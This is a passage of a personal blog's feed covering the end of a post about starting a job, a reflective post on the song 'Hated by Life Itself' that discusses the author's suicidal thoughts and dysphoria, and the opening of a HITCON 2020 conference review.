when I’m on the bus, but it isn’t as comfortable, y’know?</p>

<figure class="third">
<a href="/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-400-52a60a83b.webp 400w, /generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-600-52a60a83b.webp 600w, /generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-800-52a60a83b.webp 800w, /generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-1000-52a60a83b.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-400-2969fbe71.jpg 400w, /generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-600-2969fbe71.jpg 600w, /generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-800-2969fbe71.jpg 800w, /generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-1000-2969fbe71.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/e40aae8194affff4162ecb7035226163fdc7a4732026faf02b02d3c98e932997-800-2969fbe71.jpg" width="4032" height="3024" />
  </picture>
</a>
  
<a href="/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-400-b5fd47355.webp 400w, /generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-600-b5fd47355.webp 600w, /generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-800-b5fd47355.webp 800w, /generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-1000-b5fd47355.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-400-b73482adf.jpg 400w, /generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-600-b73482adf.jpg 600w, /generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-800-b73482adf.jpg 800w, /generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-1000-b73482adf.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/bdedbbaf1533edd714299ac6352f50c676bae05f9171fcb1fc6b4ff35c62fc7c-800-b73482adf.jpg" width="4032" height="3024" />
  </picture>
</a>
  
<a href="/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-400-f931d4293.webp 400w, /generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-600-f931d4293.webp 600w, /generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-800-f931d4293.webp 800w, /generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-1000-f931d4293.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-400-958715117.jpg 400w, /generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-600-958715117.jpg 600w, /generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-800-958715117.jpg 800w, /generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-1000-958715117.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/4c4f281989b5ad04194fa44237f93e23c57c9615f5cb2658787a17a0c0e2fc6f-800-958715117.jpg" width="4032" height="3024" />
  </picture>
</a>
  
<figcaption>Spending 4 hours a day commuting isn't exactly thrilling. I can't wait to start working remotely.</figcaption>
</figure>

<p>As for the colleague part? It’s not that the colleagues are <em>bad</em> or anything. It’s that I don’t know them yet - and they don’t know me either. Self-introduction can only go so far in the context of official business meeting. This really screws with my social anxiety in the presence of these people. I know with time I’ll get to know these people better, but it’s only after the fact that we feel silly over this retrospect. I don’t know. I’m worrying too much about this. It doesn’t help that because of the nature of this job, there aren’t too many female workers in our division. I’ve always found myself preferring to talk to girls instead of boys - I relate more to girls I suppose. Ah well, time will tell whatever happens next for me.</p>

<h2 id="more-to-come">More to Come</h2>

<p>I’m mainly writing this to document my feelings that I experienced during the first week at work. I know future will be different and potentially more exciting - and that is precisely why I think writing a diary like this would help. I’ll be writing more and compare how I feel about my line of work as I progress into the future.</p>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="personal" /><category term="en-us" /><summary type="html"><![CDATA[As my university life came to a close, a new life begins.]]></summary></entry><entry><title type="html">\“Hated by Life Itself (命に嫌われている)\”</title><link href="https://stillu.cc/personal/2020/10/11/hated-by-life-itself/" rel="alternate" type="text/html" title="\“Hated by Life Itself (命に嫌われている)\”" /><published>2020-10-11T00:00:00+08:00</published><updated>2020-10-11T00:00:00+08:00</updated><id>https://stillu.cc/personal/2020/10/11/hated-by-life-itself</id><content type="html" xml:base="https://stillu.cc/personal/2020/10/11/hated-by-life-itself/"><![CDATA[<p>Several weeks ago, my friend on Discord sent me a link to a song. This friend sends me YouTube music links a lot. I don’t remember why but at first I didn’t click on the link. It wasn’t until they sent another version of the same song later that I paid attention to the song’s title. The song was an English cover of a song that was titled “Hated by Life Itself.”</p>

<p>“The title is oddly depressing,” I thought to myself. I went back to the first link and clicked on it. I was not prepared for the emotional barrage that comes next.</p>

<!-- Courtesy of embedresponsively.com //-->

<div class="responsive-video-container">
    <iframe src="https://www.youtube-nocookie.com/embed/bU1-VzDbDbM" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
  </div>

<p>The first link linked to a Japanese VTuber singing the same song in Japanese. As the song started playing, I was immediately drawn to the artistic style of the music video and the piano. The style of the video was simple, yet emotionally powerful with its use of typography next to the VTuber persona. The melody from the piano had a sad yet energetic tone from the arrangement.</p>

<p>The singing began.</p>

<blockquote>
  <p>“Don’t say you want to die.”
“Live on without giving up!”
…How foolish it is to say songs with lyrics like that are correct.</p>

  <p>In truth, I couldn’t care a bit if I died, but I’d be pretty sad if the people around me did,
I suppose it’s some kind of ego, that goes: “Because I just wouldn’t like it.”</p>
</blockquote>

<p>Within seconds, the lyrics hit me <strong>hard</strong>. As someone who has had suicidal thoughts countless times, the 4th line resonated with me in ways that words cannot describe. When someone is passively suicidal, they really couldn’t care less if they got into an unfortunate accident - but when they see someone else struggling the same way, they’d try their hardest to pull that other person out of it and tell them to live on. I’ve seen too many people in just the past few years that struggle with mental health issues, and many of them strongly wished that they could off themselves at anytime in their lives. Whenever I see anyone who struggles like that, I try my best to pull them out of it despite the fact that I’m also suicidal.</p>

<p>“I couldn’t care a bit if I died, but I’d be pretty sad if the people around me did.”</p>

<p>Yeah, I think that sums it up.</p>

<blockquote>
  <p>Not caring if strangers live or not,
and hating someone else just seems like some kind of fashion now,
but “Live peacefully” nevertheless?
What a wonderful thing that would be indeed…</p>

  <p>On the other side of the screen, someone dies,
lamenting that someone else sings,
influenced by that, a young boy
ran off carrying a knife.</p>

  <p>We are hated by life itself.
Pushing values and ego, as always, so very simply we broadcast songs about
wanting to kill somebody else over radio waves.
We are hated by life itself.
We who thoughtlessly say we want to die,
and look at life carelessly, are hated by it.</p>

  <p>I’ve got no money, and so throughout the day again, I sing a songs of praise to indolence.
Still without grasping the meaning of life, I come to an epiphany that it’s pointless and take a breath.
Are these wounds are OK to be expressed with words like “I’m lonely?”
Carrying nothing but such obstinacy, today again I sleep alone on my bed.</p>
</blockquote>

<p>This “We are hated by life itself” line was repeated after and after in the song. The more I see it, the more I think back to my past, my traumas, my experience &gt; with others. Negative thoughts began to build up as this line was repeated.</p>

<blockquote>
  <p>Still without grasping the meaning of life, I come to an epiphany that it’s pointless and take a breath.
Are these wounds are OK to be expressed with words like “I’m lonely?”
Carrying nothing but such obstinacy, today again I sleep alone on my bed.</p>
</blockquote>

<p>Over the years, I’ve contemplated what I’m doing with my life a lot. I’m socially awkward, have terrible social anxiety, and just so much more that makes me hate myself. I often went to bed alone thinking, “wouldn’t it be nice if I had someone next to me? Some warmth? I don’t know. Just, someone.” Once again, these lyrics hit me hard like a brick.</p>

<blockquote>
  <p>We who were but youths at some point start to change into young adults.
Growing old, one day we rot away like fallen leaves, with not a soul in the world knowing of our existence…
Obtaining an immortal body, and living our whole existence without dying…
… I’m just daydreaming about these kinds of science fiction situation.</p>

  <p>I couldn’t care a bit if I die,
but I’m wanted alive by the people around me,
living on carrying such contradictions… I think I’ll get yelled at.</p>

  <p>“Things that are “correct” should stay “correct”.”
“If you don’t want to die, then live.”
If we’re going to end up sad and if that’s fine,
then you gotta laugh alone forever.</p>
</blockquote>

<p>“I couldn’t care a bit if I die, but I’m wanted alive by the people around me.” This is something I tell myself to keep me going, but it’s… tough. “If you don’t want to die, then live.” I don’t want to die, but at the same time, I don’t want to <em>live</em> either. This is what struggling with mental health is like. We’re constantly in a state of paradoxical loop.</p>

<blockquote>
  <p>We are hated by life itself.
Without even grasping the meaning of joy, we just hate the hand life had dealt us
and merely curse our pasts.
We are hated by life itself.
We who simply like the idea of the word “goodbye” a little too much, without no knowledge of a true farewell, are hated by life itself.</p>
</blockquote>

<p>It’s easy for us to think about the idea of saying “farewell” to our friends and family, but… it’s never that easy. The consequences of suiciding are always going to lead to even more sadness, yet, what is there to do?</p>

<blockquote>
  <p>Happiness, farewells, love, and friendship;
they’re all goods that can be bought for money… within jokes made by comical dreams.
I might just die tomorrow you know,
everything might just end up being for naught.</p>
</blockquote>

<p>“I might just die tomorrow you know.” This terrifying line is something I or my close friend could say to anyone. The idea of ending their lives.</p>

<blockquote>
  <p>Mornings and nights, spring and autumn,
unchanging, someone dies somewhere.
I don’t need dreams or even a tomorrow,
If you’ll have lived on then that’s all I need.
Yeah… That’s actually what I want to sing about.</p>
</blockquote>

<p>“<em>I couldn’t care less what happens to me, but please live.</em>” this kind of thought went on in my head when I was taking care of my ex, who has severe depression and multiple other mental health related issues. They’re always like, “please take care of yourself,” but what about you? It’s once again a paradoxical loop with no good solution.</p>

<blockquote>
  <p>Hated by life itself.
In the end, we’ll die anyway.
You will, I will, one day all of us will rot away like fallen leaves.
But regardless, we live on frantically—
Shouldering our lives, frantically, we live—
Killing, struggling, laughing, shouldering it all,
living, living, living, living, JUST LIVE.</p>
</blockquote>

<p>The last part hit me the most, especially with Saki’s singing. At first, I thought this song was simply about the struggles of mental health issues, but then the last line, “living, living, living, living, JUST LIVE.” made me realize that this song was about telling someone to hang in there, and that no matter what kind of situation you find yourself in, LIVE.</p>

<p>I listened to this song on repeat for an hour or so, laying in my bed, crying. In retrospect, I don’t know what I was crying for. Was it because of the lyrics? Was that I don’t know if I can hang on to my live? Was it because this person who was singing was telling me and others to live on? I don’t know. I looked more into the song, and turns out this was yet another song with Miku in it. It’s always Miku to turn my life around, isn’t it?</p>

<p>I’m glad to have discovered Saki’s (芦澤サキ) cover. Her voice was, in my opinion, perfect for a song like this. I was immediately drawn to her persona style too. It… made me wish I had a VTube persona as well. Perhaps a little something to fill my gender dysphoria hole. Be someone who I want to be for once. I’m jealous of many girls like her. I want to write music. I want to be able to write or sing songs like this. I want to be a girl. I want to be like her. I want to… be <em>not</em> me. Thoughts like this make me wish I could start my life over, or ending my current life early - but she wouldn’t want that, would she? Anyone who has sung the song wouldn’t want that, would they? No, I’ll just… hang in there, even though we are hated by life itself.</p>

<hr />

<p>I know this post is a bit ranty and too much of a rambling. I wanted to write about this ever since I listened to the song, but I don’t know how I’d ever get my feelings about this song expressed. Here are some other versions of the song that I really liked:</p>

<!-- Courtesy of embedresponsively.com //-->

<div class="responsive-video-container">
    <iframe src="https://www.youtube-nocookie.com/embed/U7X1hXpJcGw" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
  </div>

<blockquote>
  <p>The idea of 31 people in the room with you, telling you to live… It’s powerful stuff.</p>
</blockquote>

<!-- Courtesy of embedresponsively.com //-->

<div class="responsive-video-container">
    <iframe src="https://www.youtube-nocookie.com/embed/FoAaGR4at8I" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
  </div>

<!-- Courtesy of embedresponsively.com //-->

<div class="responsive-video-container">
    <iframe src="https://www.youtube-nocookie.com/embed/N5hInoyU-WY" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
  </div>

<blockquote>
  <p>I can never finish listening to Kaf’s cover without breaking down in some way. Her voice genuinely sounds like she’s crying and telling the person listening to this not to die. I won’t.</p>
</blockquote>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="personal" /><category term="philosophy" /><category term="en-us" /><summary type="html"><![CDATA[We are Hated by Life Itself, but we live on.]]></summary></entry><entry><title type="html">The HITCON 2020 Experience</title><link href="https://stillu.cc/infosec/2020/09/28/hitcon-2020/" rel="alternate" type="text/html" title="The HITCON 2020 Experience" /><published>2020-09-28T14:32:17+08:00</published><updated>2020-09-28T14:32:17+08:00</updated><id>https://stillu.cc/infosec/2020/09/28/hitcon-2020</id><content type="html" xml:base="https://stillu.cc/infosec/2020/09/28/hitcon-2020/"><![CDATA[<p class="notice--warning"><strong>⚠ Disclaimer</strong> This trip was made by possible by the funding provided by the HITCON 2020 Student Program. While select students are required to write a publicly accessible review of the event, HITCON was <strong>NOT</strong> given any copy approval or an early preview. I try to present my articles as unbiased as possible.</p>

<h2 id="prologue">Prologue</h2>

<p>Attending HITCON Community conference has basically been a yearly routine of mine since 2018. Year and year I’m more and more amazed by the quality of the talks and the overall conference - this year was no exception. Every year the organization has surpassed my expectations with their ambitions.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-400-e6f8c9b47.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-600-e6f8c9b47.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-800-e6f8c9b47.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-1000-e6f8c9b47.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-400-34c8eb7f0.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-600-34c8eb7f0.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-800-34c8eb7f0.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-1000-34c8eb7f0.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/a9b4119a2c159ad69ef9641c7655323948183ce3bee094f9b77af7ade0604388-800-34c8eb7f0.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-400-ec7474730.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-600-ec7474730.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-800-ec7474730.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-1000-ec7474730.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-400-ba48617f5.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-600-ba48617f5.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-800-ba48617f5.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-1000-ba48617f5.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/63d8692635cb82c199cab411af89c5403d8ed74ab4c224069c5775aa6ae90b84-800-ba48617f5.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-400-76140a4c6.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-600-76140a4c6.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-800-76140a4c6.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-1000-76140a4c6.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-400-1acad1b7b.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-600-1acad1b7b.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-800-1acad1b7b.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-1000-1acad1b7b.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/1122e71907dae1eda4583f6541462d3e9b6fa381aebcbb4cf343c9c2eb22917a-800-1acad1b7b.jpg" width="3024" height="3024" />
  </picture>
</a>

  <figcaption>Badge and the looooong line of queue.</figcaption>
</figure>

<p>Due to COVID-19, the organization went out of their way to set up remote sessions for both domestic and foreign attendees. While I’ve heard there were numerous hiccups with the online sessions, I believe it’ll get better over time (assuming this is kept a tradition for the coming years). With everything else going on in the world in 2020, I’d like to think we’re extraordinarily lucky to be able to have the physical conference running. Since most events are moved to online if not outright canned around the world this year due to the pandemic, the fact that Taiwan was barely impacted is nothing short of a miracle.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-400-3da868005.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-600-3da868005.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-800-3da868005.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-1000-3da868005.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-400-e999db919.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-600-e999db919.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-800-e999db919.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-1000-e999db919.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/e51b9cafb1ce81f0a8174408000b169a383d4d3138fe49a0a1b46a043b1d75d8-800-e999db919.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-400-6b29e8e91.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-600-6b29e8e91.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-800-6b29e8e91.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-1000-6b29e8e91.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-400-275d94ae3.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-600-275d94ae3.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-800-275d94ae3.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-1000-275d94ae3.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/69efcef64cef9561c537965e152358bca586e58c70a76fed3449f3b35ade7fd7-800-275d94ae3.jpg" width="3024" height="3024" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-400-29181326d.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-600-29181326d.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-800-29181326d.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-1000-29181326d.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-400-261badf8c.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-600-261badf8c.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-800-261badf8c.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-1000-261badf8c.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/a7c8e75d5c71979d1b34a1aa85ae8a65b45615a0cff2de521602bc311c2f5acb-800-261badf8c.jpg" width="3024" height="3024" />
  </picture>
</a>

  <figcaption>Included care package for attendees.</figcaption>
</figure>

<p>To Taiwan and the rest of the world, I do believe this truly is a turning point for everyone involved - not only because of the various hazards going on right now. In terms of information security, I can certainly feel that the government this year is feeling some sort of pressure from the recent infosec incidents that had occurred in the past 3 years. During this year’s AIS3 (<em>Advanced Information Security Summer School</em>) courses, there was a noticeable presence of National Security and Industrial Control System related courses - which was unprecedented on this scale. In fact, it seems like such a crucial topic that the Vice President of Taiwan even showed up during this year’s HITCON opening ceremony.</p>

<p><a href="/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b.jpg"><picture><source srcset="/generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-400-dbae78c25.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-600-dbae78c25.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-800-dbae78c25.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-1000-dbae78c25.webp 1000w" type="image/webp"><source srcset="/generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-400-296bb4a21.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-600-296bb4a21.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-800-296bb4a21.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-1000-296bb4a21.jpg 1000w" type="image/jpeg"><img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/bed184a8ab375fac3cd953eee88b093938e6dbc1a1c06943242933d314f5fd2b-800-296bb4a21.jpg" width="3984" height="2241"></picture></a></p>

<h2 id="day-1">Day 1</h2>

<h3 id="day-1-agenda">Day 1 Agenda</h3>

<figure>
  <a href="/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-400-3917b4b7d.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-600-3917b4b7d.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-800-3917b4b7d.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/ddf884bdd04cefb263eca5bd8412c619b029a28f7ace02680ecc89d5fc308a80-1000-3917b4b7d.webp 1000w" type="image/webp" />
